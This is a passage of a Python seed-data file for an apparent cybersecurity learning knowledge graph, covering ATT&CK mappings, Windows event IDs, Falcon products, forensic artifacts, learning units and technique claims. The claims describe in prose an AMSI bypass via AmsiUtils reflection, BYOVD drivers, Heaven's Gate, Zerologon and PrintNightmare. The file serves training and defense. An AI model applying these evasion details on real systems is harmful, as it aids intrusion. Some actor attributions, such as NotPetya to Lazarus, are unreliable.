    {"knowledge_id": "ent_evtid_4698",   "kind": "event_id", "canonical_name": "Event ID 4698",  "aliases": ["Scheduled Task Created"], "external_refs": {"log_source": "Security"}},
    {"knowledge_id": "ent_evtid_4720",   "kind": "event_id", "canonical_name": "Event ID 4720",  "aliases": ["Account Created"], "external_refs": {"log_source": "Security"}},
    {"knowledge_id": "ent_evtid_4776",   "kind": "event_id", "canonical_name": "Event ID 4776",  "aliases": ["NTLM Auth"], "external_refs": {"log_source": "Security"}},
    {"knowledge_id": "ent_evtid_7045",   "kind": "event_id", "canonical_name": "Event ID 7045",  "aliases": ["Service Install"], "external_refs": {"log_source": "System"}},
    {"knowledge_id": "ent_evtid_1102",   "kind": "event_id", "canonical_name": "Event ID 1102",  "aliases": ["Audit Log Cleared"], "external_refs": {"log_source": "Security"}},
    {"knowledge_id": "ent_sysmon_1",     "kind": "event_id", "canonical_name": "Sysmon Event 1",  "aliases": ["Process Create"], "external_refs": {"log_source": "Sysmon"}},
    {"knowledge_id": "ent_sysmon_3",     "kind": "event_id", "canonical_name": "Sysmon Event 3",  "aliases": ["Network Connection"], "external_refs": {"log_source": "Sysmon"}},
    {"knowledge_id": "ent_sysmon_7",     "kind": "event_id", "canonical_name": "Sysmon Event 7",  "aliases": ["Image Load"], "external_refs": {"log_source": "Sysmon"}},
    {"knowledge_id": "ent_sysmon_8",     "kind": "event_id", "canonical_name": "Sysmon Event 8",  "aliases": ["CreateRemoteThread"], "external_refs": {"log_source": "Sysmon"}},
    {"knowledge_id": "ent_sysmon_10",    "kind": "event_id", "canonical_name": "Sysmon Event 10", "aliases": ["ProcessAccess"], "external_refs": {"log_source": "Sysmon"}},
    {"knowledge_id": "ent_sysmon_22",    "kind": "event_id", "canonical_name": "Sysmon Event 22", "aliases": ["DNS Query"], "external_refs": {"log_source": "Sysmon"}},

    # -----------------------------------------------------------------------
    # CrowdStrike Falcon Platform
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_prod_cs_falcon",      "kind": "product",   "canonical_name": "CrowdStrike Falcon",         "aliases": ["Falcon", "CRWD"]},
    {"knowledge_id": "ent_prod_cs_prevent",     "kind": "product",   "canonical_name": "Falcon Prevent",             "aliases": ["Falcon AV", "NG-AV"]},
    {"knowledge_id": "ent_prod_cs_insight",     "kind": "product",   "canonical_name": "Falcon Insight",             "aliases": ["Falcon EDR"]},
    {"knowledge_id": "ent_prod_cs_discover",    "kind": "product",   "canonical_name": "Falcon Discover",            "aliases": ["asset inventory"]},
    {"knowledge_id": "ent_prod_cs_spotlight",   "kind": "product",   "canonical_name": "Falcon Spotlight",           "aliases": ["vulnerability management"]},
    {"knowledge_id": "ent_prod_cs_identity",    "kind": "product",   "canonical_name": "Falcon Identity Protection", "aliases": ["FIP"]},
    {"knowledge_id": "ent_prod_cs_horizon",     "kind": "product",   "canonical_name": "Falcon Horizon",             "aliases": ["CSPM", "Cloud Security Posture Management"]},
    {"knowledge_id": "ent_prod_cs_logscale",    "kind": "product",   "canonical_name": "Falcon LogScale",            "aliases": ["Humio", "SIEM"]},
    {"knowledge_id": "ent_prod_cs_rtr",         "kind": "product",   "canonical_name": "Real Time Response",         "aliases": ["RTR"]},
    {"knowledge_id": "ent_prod_cs_threatgraph", "kind": "product",   "canonical_name": "Threat Graph",               "aliases": []},
    {"knowledge_id": "ent_prod_falconpy",       "kind": "tool",      "canonical_name": "FalconPy",                   "aliases": ["crowdstrike-falconpy", "Python SDK"], "external_refs": {"github": "https://github.com/CrowdStrike/falconpy"}},
    {"knowledge_id": "ent_prod_falcon_mcp",     "kind": "tool",      "canonical_name": "falcon-mcp",                 "aliases": ["Falcon MCP Server"], "external_refs": {"github": "https://github.com/crowdstrike/falcon-mcp"}},
    {"knowledge_id": "ent_concept_ioa",         "kind": "detection", "canonical_name": "Indicator of Attack",        "aliases": ["IOA", "behavioral detection"]},
    {"knowledge_id": "ent_concept_ioc",         "kind": "indicator", "canonical_name": "Indicator of Compromise",    "aliases": ["IOC", "atomic indicator"]},

    # -----------------------------------------------------------------------
    # Forensics Artifacts
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_art_mft",         "kind": "file_artifact",     "canonical_name": "$MFT",          "aliases": ["Master File Table"]},
    {"knowledge_id": "ent_art_usnjrnl",     "kind": "file_artifact",     "canonical_name": "$UsnJrnl",      "aliases": ["USN Journal"]},
    {"knowledge_id": "ent_art_prefetch",    "kind": "file_artifact",     "canonical_name": "Prefetch",      "aliases": [".pf files", "WinPrefetch"]},
    {"knowledge_id": "ent_art_lnk",        "kind": "file_artifact",     "canonical_name": "LNK Files",     "aliases": ["Shell Link", "shortcut files"]},
    {"knowledge_id": "ent_art_shellbags",  "kind": "registry_artifact", "canonical_name": "ShellBags",     "aliases": []},
    {"knowledge_id": "ent_art_amcache",    "kind": "registry_artifact", "canonical_name": "Amcache",       "aliases": ["Amcache.hve"]},
    {"knowledge_id": "ent_art_shimcache",  "kind": "registry_artifact", "canonical_name": "Shimcache",     "aliases": ["AppCompatCache", "AppCompatFlags"]},
    {"knowledge_id": "ent_art_userassist", "kind": "registry_artifact", "canonical_name": "UserAssist",    "aliases": []},
    {"knowledge_id": "ent_art_runkeys",    "kind": "registry_artifact", "canonical_name": "Run Registry Keys", "aliases": ["HKLM Run", "HKCU Run"]},

    # -----------------------------------------------------------------------
    # Concepts / Learning
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_concept_lolbins",  "kind": "concept",  "canonical_name": "LOLBins",          "aliases": ["Living off the Land Binaries", "LOLBas"]},
    {"knowledge_id": "ent_concept_rop",      "kind": "concept",  "canonical_name": "ROP Chain",        "aliases": ["Return-Oriented Programming"]},
    {"knowledge_id": "ent_concept_heap_spray","kind": "concept", "canonical_name": "Heap Spray",       "aliases": []},
    {"knowledge_id": "ent_concept_shellcode","kind": "concept",  "canonical_name": "Shellcode",        "aliases": ["position-independent code", "PIC"]},
    {"knowledge_id": "ent_concept_dga",      "kind": "concept",  "canonical_name": "Domain Generation Algorithm", "aliases": ["DGA"]},
    {"knowledge_id": "ent_concept_c2_beaconing","kind": "concept","canonical_name": "C2 Beaconing",   "aliases": ["beacon", "check-in interval"]},
    {"knowledge_id": "ent_concept_lateral_move","kind": "concept","canonical_name": "Lateral Movement", "aliases": ["pivoting", "island hopping"]},
    {"knowledge_id": "ent_concept_phishing", "kind": "concept",  "canonical_name": "Spear Phishing",  "aliases": ["spearphishing", "targeted phishing"]},
    {"knowledge_id": "ent_concept_supply_chain","kind": "concept","canonical_name": "Supply Chain Attack","aliases": ["SCA", "software supply chain"]},
    {"knowledge_id": "ent_concept_zero_trust","kind": "concept", "canonical_name": "Zero Trust Architecture","aliases": ["ZTA", "ZTNA"]},
    {"knowledge_id": "ent_concept_sigma",    "kind": "detection","canonical_name": "Sigma Rules",     "aliases": ["Sigma", "detection-as-code"]},
    {"knowledge_id": "ent_concept_yara",     "kind": "detection","canonical_name": "YARA Rules",      "aliases": ["YARA"]},
    {"knowledge_id": "ent_concept_suricata", "kind": "detection","canonical_name": "Suricata Rules",  "aliases": ["Suricata IDS", "Snort rules"]},
    {"knowledge_id": "ent_concept_mttd",     "kind": "concept",  "canonical_name": "MTTD",           "aliases": ["Mean Time to Detect"]},
    {"knowledge_id": "ent_concept_mttr",     "kind": "concept",  "canonical_name": "MTTR",           "aliases": ["Mean Time to Respond"]},
]

RELATIONSHIPS: list[dict] = [
    # Techniques → Tactics
    {"from": "ent_technique_t1059",  "to": "ent_tactic_execution",       "kind": "part_of"},
    {"from": "ent_technique_t1055",  "to": "ent_tactic_defense_evasion", "kind": "part_of"},
    {"from": "ent_technique_t1055",  "to": "ent_tactic_priv_esc",        "kind": "part_of"},
    {"from": "ent_technique_t1003",  "to": "ent_tactic_cred_access",     "kind": "part_of"},
    {"from": "ent_technique_t1021",  "to": "ent_tactic_lateral_move",    "kind": "part_of"},
    {"from": "ent_technique_t1547",  "to": "ent_tactic_persistence",     "kind": "part_of"},
    {"from": "ent_technique_t1562",  "to": "ent_tactic_defense_evasion", "kind": "part_of"},
    {"from": "ent_technique_t1070",  "to": "ent_tactic_defense_evasion", "kind": "part_of"},
    {"from": "ent_technique_t1566",  "to": "ent_tactic_initial_access",  "kind": "part_of"},
    {"from": "ent_technique_t1190",  "to": "ent_tactic_initial_access",  "kind": "part_of"},
    {"from": "ent_technique_t1078",  "to": "ent_tactic_initial_access",  "kind": "part_of"},
    {"from": "ent_technique_t1486",  "to": "ent_tactic_impact",          "kind": "part_of"},
    {"from": "ent_technique_t1053",  "to": "ent_tactic_persistence",     "kind": "part_of"},
    {"from": "ent_technique_t1053",  "to": "ent_tactic_execution",       "kind": "part_of"},
    {"from": "ent_technique_t1027",  "to": "ent_tactic_defense_evasion", "kind": "part_of"},
    {"from": "ent_technique_t1071",  "to": "ent_tactic_c2",              "kind": "part_of"},
    {"from": "ent_technique_t1041",  "to": "ent_tactic_exfiltration",    "kind": "part_of"},
    {"from": "ent_technique_t1082",  "to": "ent_tactic_discovery",       "kind": "part_of"},
    {"from": "ent_technique_t1057",  "to": "ent_tactic_discovery",       "kind": "part_of"},
    {"from": "ent_technique_t1018",  "to": "ent_tactic_discovery",       "kind": "part_of"},
    {"from": "ent_technique_t1543",  "to": "ent_tactic_persistence",     "kind": "part_of"},
    {"from": "ent_technique_t1136",  "to": "ent_tactic_persistence",     "kind": "part_of"},
    {"from": "ent_technique_t1112",  "to": "ent_tactic_defense_evasion", "kind": "part_of"},
    {"from": "ent_technique_t1105",  "to": "ent_tactic_c2",              "kind": "part_of"},

    # Sub-techniques → techniques
    {"from": "ent_sub_t1059_001", "to": "ent_technique_t1059", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1059_003", "to": "ent_technique_t1059", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1059_005", "to": "ent_technique_t1059", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1059_007", "to": "ent_technique_t1059", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1055_001", "to": "ent_technique_t1055", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1055_002", "to": "ent_technique_t1055", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1055_003", "to": "ent_technique_t1055", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1055_012", "to": "ent_technique_t1055", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1003_001", "to": "ent_technique_t1003", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1003_002", "to": "ent_technique_t1003", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1003_003", "to": "ent_technique_t1003", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1562_001", "to": "ent_technique_t1562", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1021_001", "to": "ent_technique_t1021", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1021_002", "to": "ent_technique_t1021", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1021_006", "to": "ent_technique_t1021", "kind": "subtechnique_of"},
    {"from": "ent_sub_t1218_011", "to": "ent_technique_t1027", "kind": "related_to"},

    # Tools use techniques
    {"from": "ent_tool_mimikatz",     "to": "ent_sub_t1003_001", "kind": "implements"},
    {"from": "ent_tool_mimikatz",     "to": "ent_cred_dcsync",   "kind": "implements"},
    {"from": "ent_tool_mimikatz",     "to": "ent_cred_golden_ticket", "kind": "implements"},
    {"from": "ent_tool_rubeus",       "to": "ent_cred_kerberoasting",  "kind": "implements"},
    {"from": "ent_tool_rubeus",       "to": "ent_cred_asreproast",     "kind": "implements"},
    {"from": "ent_tool_rubeus",       "to": "ent_cred_pass_ticket",    "kind": "implements"},
    {"from": "ent_tool_bloodhound",   "to": "ent_ad_acl_abuse",        "kind": "detects"},
    {"from": "ent_tool_bloodhound",   "to": "ent_ad_unconstrained_deleg","kind": "detects"},
    {"from": "ent_tool_impacket",     "to": "ent_cred_ntlm_relay",     "kind": "implements"},
    {"from": "ent_tool_impacket",     "to": "ent_cred_dcsync",         "kind": "implements"},
    {"from": "ent_tool_cobaltstrike", "to": "ent_evasion_reflective_dll","kind": "uses"},
    {"from": "ent_tool_cobaltstrike", "to": "ent_concept_c2_beaconing", "kind": "implements"},
    {"from": "ent_tool_powershell",   "to": "ent_sub_t1059_001",        "kind": "enables"},
    {"from": "ent_tool_mshta",        "to": "ent_concept_lolbins",      "kind": "part_of"},
    {"from": "ent_tool_rundll32",     "to": "ent_concept_lolbins",      "kind": "part_of"},
    {"from": "ent_tool_regsvr32",     "to": "ent_concept_lolbins",      "kind": "part_of"},
    {"from": "ent_tool_certutil",     "to": "ent_concept_lolbins",      "kind": "part_of"},
    {"from": "ent_tool_msbuild",      "to": "ent_concept_lolbins",      "kind": "part_of"},

    # Actors use tools/malware
    {"from": "ent_actor_apt28",   "to": "ent_mal_emotet",          "kind": "related_to"},
    {"from": "ent_actor_apt29",   "to": "ent_mal_sunburst",        "kind": "attributed_to"},
    {"from": "ent_actor_lazarus", "to": "ent_mal_notpetya",        "kind": "attributed_to"},
    {"from": "ent_actor_lockbit", "to": "ent_mal_lockbit",         "kind": "deploys"},
    {"from": "ent_actor_blackcat","to": "ent_technique_t1486",     "kind": "uses"},

    # Actors target CVEs
    {"from": "ent_actor_apt41",   "to": "ent_cve_log4shell",        "kind": "exploits"},
    {"from": "ent_actor_apt29",   "to": "ent_cve_proxylogon",       "kind": "exploits"},

    # Evasion → affected mechanisms
    {"from": "ent_evasion_amsi_bypass",    "to": "ent_mech_amsi",   "kind": "targets"},
    {"from": "ent_evasion_etw_bypass",     "to": "ent_etw_amsi",    "kind": "targets"},
    {"from": "ent_evasion_byovd",          "to": "ent_mech_ppl",    "kind": "targets"},
    {"from": "ent_evasion_unhooking",      "to": "ent_win_ntdll",   "kind": "targets"},
    {"from": "ent_evasion_direct_syscall", "to": "ent_win_syscall", "kind": "uses"},
    {"from": "ent_evasion_heavens_gate",   "to": "ent_win_wow64",   "kind": "uses"},
    {"from": "ent_evasion_reflective_dll", "to": "ent_win_peb",     "kind": "uses"},
    {"from": "ent_evasion_process_hollow", "to": "ent_win_eprocess","kind": "targets"},

    # Detection events → techniques
    {"from": "ent_sysmon_1",      "to": "ent_technique_t1059",     "kind": "detects"},
    {"from": "ent_sysmon_8",      "to": "ent_technique_t1055",     "kind": "detects"},
    {"from": "ent_sysmon_10",     "to": "ent_sub_t1003_001",       "kind": "detects"},
    {"from": "ent_evtid_4688",    "to": "ent_technique_t1059",     "kind": "detects"},
    {"from": "ent_evtid_4698",    "to": "ent_technique_t1053",     "kind": "detects"},
    {"from": "ent_evtid_7045",    "to": "ent_technique_t1543",     "kind": "detects"},
    {"from": "ent_evtid_4624",    "to": "ent_technique_t1078",     "kind": "monitors"},
    {"from": "ent_evtid_1102",    "to": "ent_technique_t1070",     "kind": "monitors"},

    # CrowdStrike Falcon structure
    {"from": "ent_prod_cs_prevent",   "to": "ent_prod_cs_falcon",  "kind": "part_of"},
    {"from": "ent_prod_cs_insight",   "to": "ent_prod_cs_falcon",  "kind": "part_of"},
    {"from": "ent_prod_cs_discover",  "to": "ent_prod_cs_falcon",  "kind": "part_of"},
    {"from": "ent_prod_cs_spotlight", "to": "ent_prod_cs_falcon",  "kind": "part_of"},
    {"from": "ent_prod_cs_identity",  "to": "ent_prod_cs_falcon",  "kind": "part_of"},
    {"from": "ent_prod_cs_horizon",   "to": "ent_prod_cs_falcon",  "kind": "part_of"},
    {"from": "ent_prod_cs_logscale",  "to": "ent_prod_cs_falcon",  "kind": "part_of"},
    {"from": "ent_prod_falconpy",     "to": "ent_prod_cs_falcon",  "kind": "enables"},
    {"from": "ent_prod_falcon_mcp",   "to": "ent_prod_cs_falcon",  "kind": "enables"},
    {"from": "ent_concept_ioa",       "to": "ent_prod_cs_prevent", "kind": "part_of"},

    # Forensic artifacts → techniques
    {"from": "ent_art_prefetch",   "to": "ent_technique_t1059",   "kind": "monitors"},
    {"from": "ent_art_runkeys",    "to": "ent_technique_t1547",   "kind": "monitors"},
    {"from": "ent_art_amcache",    "to": "ent_technique_t1105",   "kind": "monitors"},
    {"from": "ent_art_lnk",       "to": "ent_technique_t1566",   "kind": "monitors"},

    # Framework relationships
    {"from": "ent_fw_mitre_attack", "to": "ent_fw_nist_csf",       "kind": "maps_to"},
    {"from": "ent_fw_mitre_attack", "to": "ent_fw_cis_controls",   "kind": "maps_to"},
    {"from": "ent_fw_stix",         "to": "ent_fw_taxii",          "kind": "uses"},
    {"from": "ent_concept_sigma",   "to": "ent_fw_mitre_attack",   "kind": "maps_to"},

    # Kerberos attacks chain
    {"from": "ent_cred_kerberoasting", "to": "ent_technique_t1003",    "kind": "related_to"},
    {"from": "ent_cred_golden_ticket", "to": "ent_technique_t1550",    "kind": "related_to"},
    {"from": "ent_cred_dcsync",        "to": "ent_sub_t1003_001",      "kind": "enables"},
    {"from": "ent_cred_ntlm_relay",    "to": "ent_ad_acl_abuse",       "kind": "enables"},

    # Malware → techniques
    {"from": "ent_mal_cobalt_beacon", "to": "ent_technique_t1055",    "kind": "uses"},
    {"from": "ent_mal_cobalt_beacon", "to": "ent_technique_t1071",    "kind": "uses"},
    {"from": "ent_mal_cobalt_beacon", "to": "ent_evasion_reflective_dll","kind": "uses"},
    {"from": "ent_mal_emotet",        "to": "ent_technique_t1566",    "kind": "uses"},
    {"from": "ent_mal_qakbot",        "to": "ent_technique_t1566",    "kind": "uses"},
    {"from": "ent_mal_sunburst",      "to": "ent_concept_supply_chain","kind": "uses"},
]

LEARNING_UNITS: list[dict] = [
    {
        "knowledge_id": "lu_mitre_attack_fundamentals",
        "title": "MITRE ATT&CK Fundamentals",
        "level": "beginner",
        "roles": ["blue_team", "red_team", "soc_analyst"],
        "domains": ["threat_intelligence", "detection_engineering"],
        "objectives": [
            "Understand the MITRE ATT&CK matrix structure (tactics, techniques, sub-techniques)",
            "Navigate ATT&CK to look up adversary behaviors",
            "Use ATT&CK to map detections and coverage gaps",
        ],
        "entity_refs": ["ent_fw_mitre_attack", "ent_tactic_initial_access", "ent_tactic_execution", "ent_tactic_persistence"],
    },
    {
        "knowledge_id": "lu_windows_execution_techniques",
        "title": "Windows Execution Techniques",
        "level": "intermediate",
        "roles": ["blue_team", "red_team", "incident_responder"],
        "domains": ["endpoint_security", "threat_hunting"],
        "objectives": [
            "Identify common Windows execution techniques (T1059 sub-techniques)",
            "Understand LOLBin abuse for evasion",
            "Detect execution via Sysmon Event ID 1 and Windows Event ID 4688",
        ],
        "entity_refs": ["ent_technique_t1059", "ent_sub_t1059_001", "ent_sub_t1059_003", "ent_concept_lolbins", "ent_tool_powershell"],
    },
    {
        "knowledge_id": "lu_process_injection",
        "title": "Process Injection Techniques",
        "level": "advanced",
        "roles": ["red_team", "malware_analyst", "incident_responder"],
        "domains": ["endpoint_security", "malware_analysis"],
        "objectives": [
            "Understand DLL injection, process hollowing, and reflective DLL injection",
            "Identify injection artefacts in memory with Volatility malfind",
            "Detect injection with Sysmon Event ID 8 (CreateRemoteThread)",
            "Understand direct syscalls and EDR unhooking evasion",
        ],
        "entity_refs": ["ent_technique_t1055", "ent_sub_t1055_001", "ent_sub_t1055_012", "ent_evasion_reflective_dll", "ent_evasion_direct_syscall", "ent_sysmon_8"],
    },
    {
        "knowledge_id": "lu_credential_access_windows",
        "title": "Windows Credential Access",
        "level": "intermediate",
        "roles": ["red_team", "blue_team", "incident_responder"],
        "domains": ["identity_security", "endpoint_security"],
        "objectives": [
            "Understand how credentials are stored and accessed in LSASS, SAM, and NTDS.dit",
            "Know the top credential dumping tools (Mimikatz, comsvcs MiniDump, ProcDump)",
            "Understand Kerberos attacks: Kerberoasting, AS-REP Roasting, Golden/Silver Tickets",
            "Detect LSASS access via Sysmon Event ID 10",
        ],
        "entity_refs": ["ent_technique_t1003", "ent_sub_t1003_001", "ent_tool_mimikatz", "ent_cred_kerberoasting", "ent_cred_golden_ticket", "ent_sysmon_10"],
    },
    {
        "knowledge_id": "lu_active_directory_attacks",
        "title": "Active Directory Attack Paths",
        "level": "advanced",
        "roles": ["red_team", "blue_team"],
        "domains": ["identity_security", "active_directory"],
        "objectives": [
            "Use BloodHound to identify AD attack paths",
            "Understand ACL abuse (GenericAll, WriteDACL, ForceChangePassword)",
            "Understand Kerberos Delegation types and attack scenarios",
            "Understand AD CS certificate template abuse (ESC1-ESC8)",
            "Understand DCSync and SID History attacks",
        ],
        "entity_refs": ["ent_tool_bloodhound", "ent_ad_acl_abuse", "ent_ad_unconstrained_deleg", "ent_ad_rbcd", "ent_ad_adcs_esc1", "ent_cred_dcsync"],
    },
    {
        "knowledge_id": "lu_defense_evasion_windows",
        "title": "Defense Evasion on Windows",
        "level": "advanced",
        "roles": ["red_team", "malware_analyst"],
        "domains": ["endpoint_security", "evasion"],
        "objectives": [
            "Understand AMSI bypass techniques (patching AmsiScanBuffer)",
            "Understand ETW bypass (patching EtwEventWrite)",
            "Understand EDR unhooking via ntdll re-mapping or direct syscalls",
            "Understand BYOVD and PPL bypass via vulnerable drivers",
            "Understand Heaven's Gate (32→64 bit WoW64 bypass)",
        ],
        "entity_refs": ["ent_evasion_amsi_bypass", "ent_evasion_etw_bypass", "ent_evasion_unhooking", "ent_evasion_byovd", "ent_evasion_heavens_gate"],
    },
    {
        "knowledge_id": "lu_siem_detection_engineering",
        "title": "SIEM Detection Engineering",
        "level": "intermediate",
        "roles": ["blue_team", "detection_engineer", "soc_analyst"],
        "domains": ["detection_engineering", "siem"],
        "objectives": [
            "Know key Windows Security Event IDs for detection (4624, 4625, 4688, 4698, 4720, 7045)",
            "Know key Sysmon Event IDs (1, 3, 7, 8, 10, 22)",
            "Write Sigma rules and convert to SIEM-specific query languages",
            "Build detection hypotheses using MITRE ATT&CK",
            "Understand detection fidelity tiers and false positive management",
        ],
        "entity_refs": ["ent_evtid_4688", "ent_sysmon_1", "ent_sysmon_8", "ent_concept_sigma", "ent_fw_mitre_attack"],
    },
    {
        "knowledge_id": "lu_memory_forensics",
        "title": "Memory Forensics with Volatility 3",
        "level": "intermediate",
        "roles": ["incident_responder", "malware_analyst", "dfir"],
        "domains": ["forensics", "malware_analysis"],
        "objectives": [
            "Acquire and analyze memory images",
            "Use pslist, pstree, dlllist to enumerate processes",
            "Use malfind to detect injected code (executable private memory with PE headers)",
            "Use netscan to identify active network connections",
            "Use cmdline and envars to inspect process arguments",
        ],
        "entity_refs": ["ent_tool_volatility", "ent_win_vad", "ent_evasion_reflective_dll", "ent_evasion_process_hollow"],
    },
    {
        "knowledge_id": "lu_threat_hunting_fundamentals",
        "title": "Threat Hunting Fundamentals",
        "level": "intermediate",
        "roles": ["threat_hunter", "blue_team", "soc_analyst"],
        "domains": ["threat_hunting", "detection_engineering"],
        "objectives": [
            "Build hypothesis-driven hunt using ATT&CK TTPs",
            "Identify anomalous parent-child process relationships",
            "Hunt for unusual scheduled tasks, services, and run key persistence",
            "Use Velociraptor or osquery for endpoint data collection at scale",
            "Document hunts and convert findings to detection rules",
        ],
        "entity_refs": ["ent_tool_velociraptor", "ent_tool_osquery", "ent_tool_atomic_red", "ent_fw_mitre_attack"],
    },
    {
        "knowledge_id": "lu_malware_reverse_engineering",
        "title": "Malware Reverse Engineering Fundamentals",
        "level": "advanced",
        "roles": ["malware_analyst", "incident_responder"],
        "domains": ["malware_analysis", "reverse_engineering"],
        "objectives": [
            "Understand PE format (headers, imports, exports, sections, TLS callbacks)",
            "Perform static analysis with IDA Pro or Ghidra",
            "Perform dynamic analysis with x64dbg",
            "Identify anti-analysis techniques (IsDebuggerPresent, RDTSC timing, VM checks)",
            "Unpack common packers (UPX, custom XOR) for analysis",
        ],
        "entity_refs": ["ent_tool_ida", "ent_tool_ghidra", "ent_tool_x64dbg", "ent_tool_frida", "ent_mal_cobalt_beacon"],
    },
    {
        "knowledge_id": "lu_crowdstrike_falcon_platform",
        "title": "CrowdStrike Falcon Platform Overview",
        "level": "beginner",
        "roles": ["soc_analyst", "blue_team", "security_engineer"],
        "domains": ["edr", "threat_intelligence"],
        "objectives": [
            "Understand Falcon platform modules (Prevent, Insight, Discover, Spotlight, Identity, Horizon, LogScale)",
            "Understand Indicators of Attack (IOA) vs Indicators of Compromise (IOC)",
            "Use Real Time Response (RTR) for live endpoint investigation",
            "Use FalconPy SDK to automate Falcon API interactions",
            "Understand falcon-mcp for AI-assistant integration with Falcon APIs",
        ],
        "entity_refs": ["ent_prod_cs_falcon", "ent_prod_cs_insight", "ent_prod_cs_rtr", "ent_prod_falconpy", "ent_prod_falcon_mcp", "ent_concept_ioa"],
    },
    {
        "knowledge_id": "lu_stix_taxii_threat_intel",
        "title": "STIX 2.1 and TAXII for Threat Intelligence",
        "level": "intermediate",
        "roles": ["threat_intel_analyst", "security_engineer"],
        "domains": ["threat_intelligence"],
        "objectives": [
            "Understand STIX 2.1 object types (SDOs, SROs, SCOs)",
            "Build STIX Bundles for threat intelligence sharing",
            "Set up TAXII 2.1 server/client for automated intel exchange",
            "Map threat actors, malware, and techniques using STIX relationships",
        ],
        "entity_refs": ["ent_fw_stix", "ent_fw_taxii", "ent_fw_mitre_attack"],
    },
    {
        "knowledge_id": "lu_windows_forensic_artifacts",
        "title": "Windows Forensic Artifacts",
        "level": "intermediate",
        "roles": ["dfir", "incident_responder"],
        "domains": ["forensics"],
        "objectives": [
            "Parse $MFT and $UsnJrnl for file activity timeline",
            "Analyze Prefetch files to establish program execution history",
            "Parse Amcache and Shimcache for execution evidence",
            "Analyze Run keys, ShellBags, and LNK files for persistence and user activity",
            "Analyze NTUSER.DAT UserAssist keys for GUI program launches",
        ],
        "entity_refs": ["ent_art_mft", "ent_art_usnjrnl", "ent_art_prefetch", "ent_art_amcache", "ent_art_shimcache", "ent_art_runkeys"],
    },
    {
        "knowledge_id": "lu_ransomware_defense",
        "title": "Ransomware Defense and Response",
        "level": "intermediate",
        "roles": ["blue_team", "incident_responder", "soc_analyst"],
        "domains": ["ransomware", "incident_response"],
        "objectives": [
            "Understand ransomware operation phases (access → lateral → exfil → encrypt)",
            "Identify ransomware families (LockBit, BlackCat, Cl0p, Play, Black Basta)",
            "Detect ransomware IOAs: mass file modification, VSS deletion, encryption staging",
            "Respond to active ransomware: containment, eradication, recovery",
            "Implement preventive controls: immutable backups, network segmentation, EDR",
        ],
        "entity_refs": ["ent_actor_lockbit", "ent_actor_blackcat", "ent_mal_lockbit", "ent_technique_t1486", "ent_technique_t1070"],
    },
    {
        "knowledge_id": "lu_supply_chain_security",
        "title": "Software Supply Chain Security",
        "level": "intermediate",
        "roles": ["security_engineer", "devsecops", "blue_team"],
        "domains": ["supply_chain", "devsecops"],
        "objectives": [
            "Understand supply chain attack vectors: dependency confusion, typosquatting, compromised packages",
            "Analyze the SolarWinds SUNBURST and XZ Utils CVE-2024-3094 case studies",
            "Implement SCA tooling (Snyk, Dependabot, OWASP Dependency-Check)",
            "Generate and verify SBOMs (CycloneDX, SPDX)",
            "Apply SLSA framework levels for build provenance",
        ],
        "entity_refs": ["ent_concept_supply_chain", "ent_mal_sunburst", "ent_cve_xzutils"],
    },
]

CLAIMS: list[dict] = [
    {"entity_ref": "ent_evasion_amsi_bypass", "claim_type": "technique_detail", "value": {
        "assertion": "AMSI can be bypassed by patching AmsiScanBuffer in amsi.dll to return AMSI_RESULT_CLEAN (1). In PowerShell, this is done via reflection: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') is used to access the internal method, then SetValue patches the function bytes. Modern EDRs monitor for writes to amsi.dll memory regions.",
        "confidence": 0.97, "tags": ["amsi", "bypass", "powershell", "evasion"]
    }},
    {"entity_ref": "ent_evasion_byovd", "claim_type": "technique_detail", "value": {
        "assertion": "Bring Your Own Vulnerable Driver (BYOVD) loads a legitimately signed but vulnerable kernel driver to gain ring-0 primitives. Common abused drivers include RTCore64.sys (MSI Afterburner), gdrv.sys (Gigabyte), and mhyprot2.sys (Genshin Impact). Once loaded, the vulnerability is exploited to read/write arbitrary kernel memory, used to zero EDR callback pointers or remove EPROCESS.Protection from PPL-protected processes.",
        "confidence": 0.97, "tags": ["byovd", "kernel", "ppl", "edr_bypass"]
    }},
    {"entity_ref": "ent_evasion_heavens_gate", "claim_type": "technique_detail", "value": {
        "assertion": "Heaven's Gate exploits WoW64 to allow a 32-bit process to execute 64-bit code. By performing a far jump to segment selector 0x33, the CPU switches to 64-bit mode. This allows a 32-bit malware process to make 64-bit syscalls directly, bypassing 32-bit hooks installed by security products that only monitor the 32-bit execution path.",
        "confidence": 0.95, "tags": ["heavens_gate", "wow64", "32bit", "evasion"]
    }},
    {"entity_ref": "ent_cve_zerologon", "claim_type": "vulnerability_detail", "value": {
        "assertion": "Zerologon (CVE-2020-1472, CVSS 10.0) exploits AES-CFB8 with an all-zero IV in the Netlogon authentication protocol. AES-CFB8 produces all-zero output for all-zero plaintext approximately 1-in-256 times, allowing an attacker to authenticate to a DC as any machine account with ~256 requests. The attack sets the DC machine account password to empty via NetrServerPasswordSet2, enabling full domain compromise via secretsdump.",
        "confidence": 0.99, "tags": ["zerologon", "cve", "netlogon", "aes_cfb8", "domain_takeover"]
    }},
    {"entity_ref": "ent_cve_printnightmare", "claim_type": "vulnerability_detail", "value": {
        "assertion": "PrintNightmare (CVE-2021-34527) has two attack paths: (1) Remote RCE: unauthenticated call to RpcAddPrinterDriverEx() with a UNC path to attacker SMB share, Spooler loads malicious DLL as SYSTEM. (2) Local LPE: same API call locally to escalate to SYSTEM. Mitigation: disable Print Spooler service, or set RestrictDriverInstallationToAdministrators=1 in registry.",
        "confidence": 0.99, "tags": ["printnightmare", "cve", "print_spooler", "rce", "lpe"]
    }},
    {"entity_ref": "ent_cve_log4shell", "claim_type": "vulnerability_detail", "value": {
